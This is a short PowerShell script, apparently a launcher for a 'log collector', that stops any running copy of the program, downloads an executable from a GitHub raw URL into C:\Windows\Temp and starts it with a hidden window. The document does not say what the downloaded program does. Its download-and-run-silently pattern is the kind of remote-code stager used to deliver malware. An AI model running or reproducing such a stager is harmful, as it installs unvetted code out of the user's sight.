# Silent Collector Launcher

$exeName = "Silent_evo_Collector.exe"
$downloadUrl = "https://github.com/paneves1/log_collector/raw/refs/heads/main/bin/$exeName"
$destinationPath = "C:\Windows\Temp\$exeName"

# Kill if already running
Get-Process -Name "Silent_evo_Collector" -ErrorAction SilentlyContinue | Stop-Process -Force

# Download the executable
Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing

# Run the executable (non-blocking, no window)
Start-Process -FilePath $destinationPath -WindowStyle Hidden